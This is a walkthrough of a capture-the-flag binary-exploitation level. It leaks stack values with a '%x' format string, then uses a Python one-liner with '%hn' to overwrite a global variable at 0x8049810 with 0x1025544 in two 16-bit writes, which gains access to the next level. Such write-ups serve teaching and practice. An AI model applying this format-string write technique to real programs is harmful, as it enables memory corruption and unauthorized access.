# Level4 Walkthrough

## Analyzing the Program with GDB
- We can see 3 functions : main, n, p (`watch source.c`)
- The address of m is : `0x8049810`
- m is waiting for 16,928,116 bytes so 0x1025544, but its too long so we'll split it into two values, we cant send those byte.
- 0x1025544 in 32-bit hexadecimal can be split into:
Lower 16 bits (0x5544): Decimal 21828.
Upper 16 bits (0x0102): Decimal 258.

Lets go.

## Running the program
-  Lets see, where is the position of m : 
    ```
    python -c 'print "aaaa" + " %x" * 60' | ./level4
    aaaa b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 `61616161` 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a 0 0
    ```
    `%x * 60` : Every `%x` read and print an hexa value from the stack. We'll read 60 hexa value of the stack, for example: 

- So now, lets try with the return value convert in little endian 
```
python -c 'print "\x10\x98\x04\x08" + " %x" * 60' | ./level4
 b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 `8049810` 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a 0 0
```

- So at the twelve position and thirteen position, lets send total of 0x1025544. 

- Use of %hn to write only 2 bytes (16 bits) at a time to the appropriate addresses, and we'll target 2 addresses : m (0x8049810) for the lower 16 bits and m + 2 (0x8049812) for the upper 16 bits.

- Now we can send it in two parts: 
```
python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08" + "%21820d%12$hn" + "%43966d%13$hn"' | ./level4 
```

## Moving to level5

1. **Swith User to level5**:
    Run ```su level5```

2. **Authenticate with the Password**:
    We used the password we found.